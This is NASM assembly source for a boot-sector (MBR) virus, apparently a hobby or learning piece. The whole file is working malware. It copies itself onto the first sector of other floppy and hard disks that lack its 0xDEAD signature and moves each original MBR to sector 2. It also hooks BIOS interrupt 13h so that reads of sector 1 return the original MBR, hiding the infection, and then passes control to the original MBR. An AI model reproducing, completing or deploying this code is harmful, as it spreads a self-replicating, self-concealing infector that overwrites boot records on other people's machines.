[bits 16]
org 0x7c00


start:
  cli                         ; no interrupt zone
  mov BYTE [bootDrive], dl    ; save boot drive, this is infected drive
  mov sp, 0xFFF8              ; stack pointer
  pusha
  xor ax, ax
  mov ds, ax
  mov es, ax

                            ; let's save infected mbr to location 0x7e00
  mov al, 0x01              ; load 1 sector
  mov ah, 0x02              ; read sector
  mov bx, 0x7e00            ; destination address + ES
  mov cx, 0x0001            ; cylinder 0, sector=1
  xor dh, dh                ; head 0
  call wr_sector
  ; TODO: read from 0x7c00!!!!
  ; now it's time to iterate through disks
  xor di, di                ; our disk counter
dsk_lp:
  mov dl, [disk_codes+di]   ; load disk code from our table
  cmp dl, [bootDrive]       ; check if this is our infected drive
  je nxt_disk               ; this is our drive, just go to the next one

  mov ah, 0x02              ; read sector
  mov cx, 0x0001            ; cylinder 0, sector=1
  mov bx, 0x8000            ; load original mbr to 0x8000
  call wr_sector
  jc nxt_disk               ; if carry is set, disk doesn't exist (most likely)
  add bx, sig               ; check if this drive is already signed
  sub bx, 0x7c00            ; calculated offset for signature
  cmp word [bx], 0xDEAD     ; compare with our signature 0xDEAD
  je nxt_disk               ; if already signed, jump to next disk

  mov ah, 0x03              ; dirty business, copy our infected mbr to new drive
  mov bx, 0x7e00            ; we copied infected mbr to 0x7e00 earlier
  call wr_sector            ; perform write

  mov ah, 0x03
  mov cx, 0x0002            ; write original mbr to 2nd sector
  mov bx, 0x8000            ; we saved sector to 0x8000
  call wr_sector            ; perform write
nxt_disk:
  inc di                    ; increment our counter
  cmp di, 0x04              ; we are over the available disks
  jl dsk_lp                ; jump if lower than 4

; now we'll copy back original MBR and jump to it
; we have to relocate ourselves to 0x7e00, so we don't overwrite when copying
; original MBR
relocate:
  xor ax, ax
  mov ds, ax
  dec word [ds:0x413]
  dec word [ds:0x413]
  mov ax, [ds:0x413]
  shl ax, (10-4)
  mov es, ax
  ;sub ax, 0x7c0
  mov dl, [bootDrive]             ; retrieve current boot drive
  mov si, cpy_original            ; source address
  xor di, di
  ;mov di, 0x500                  ; destination address, 0x500 in our case
  mov cx, end_cpy                 ; load end of code address
  sub cx, cpy_original            ; subtract start of code, cx = code length
  rep movsb                       ; copy stuff from source to dest address

  push es
  push word 0x0
  retf

; this code resides on 0x500 after copying
cpy_original:                   ; this code will copy original MBR to 0x7c00
  xor ax, ax
  mov es, ax
  mov ah, 0x02                  ; read sector, ah = 0x02
  mov al, 0x01
  mov cx, 0x0002                ; read 2nd sector
  mov bx, 0x7c00                ; dest address
  call wr_sector                ; copy orignal MBR

  ; before we jump into org mbr, let's hook int 13h
  mov ax, word [es:0x13*4]                         ; get old 13h vector (offset)
  mov bx, word [es:0x13*4+2]                       ; get old 13h vector (segment)
  mov [cs:oldint13-cpy_original], ax        ; save old interrupt offset
  mov [cs:oldint13-cpy_original+2], bx      ; save old interrupt segment
  mov ax, dsk_hook
  sub ax, cpy_original
  mov word [es:0x13*4], ax
  mov word [es:0x13*4+2], cs                        ; save new adress to 13h vector
  popa
  jmp 0x0:0x7c00                                ; far jump to the original MBR

; disk hook that will resident in memory
dsk_hook:
  pushf                                         ; push flags
  cmp ah, 0x02                                  ; check if read access
  jne .end_hook
  cmp cx, 0x0001                                ; check if 1st sector
  jne .end_hook
  mov cx, 0x0002                                ; change it to original MBR
.end_hook:
  popf
  push word [cs:oldint13-cpy_original+2] ; push segment
  push word [cs:oldint13-cpy_original]   ; push offset
  retf                                          ; call original handler
  sti
  iret


oldint13:
  dd 0xDEBEFEAA                                         ; var for saving int13 address

; write/read sector on disk, based on
; ah = 0x02 read, ah = 0x03 write
; dl = disk number
wr_sector:
  mov si, 0x03                ; max number of attempts to read from drive
  .lprs:
    int 0x13
    jnc .endrs                  ; alright carry was not set, read was successful
    dec si                      ; decrement counter
    jc .endrs
    push ax
    xor ah, ah                  ; ah = 0, reset disk
    int 0x13                    ; reset disk, we have to try this at most 3 times
    pop ax
    jmp .lprs
  .endrs:
    retn

end_cpy:                         ; end of code for copying original MBR

bootDrive db 0                ; Our Drive Number Variable
disk_codes:                   ; available drives variable
  db 0x0                      ; first floppy disk
  db 0x1                      ; second floppy disk
  db 0x80                     ; first hard disk
  db 0x81                     ; second hard disk
sig dw 0xDEAD                 ; very creative signature
db "VIRUS SIGNATURE.$"        ; for easier to see when seeing MBR code

times (0x1b4 - ($-$$)) nop    ; Pad For MBR Partition Table

UID times 10 db 0             ; Unique Disk ID
PT1 times 16 db 0             ; First Partition Entry
PT2 times 16 db 0             ; Second Partition Entry
PT3 times 16 db 0             ; Third Partition Entry
PT4 times 16 db 0             ; Fourth Partition Entry

dw 0xAA55                     ; Boot Signature
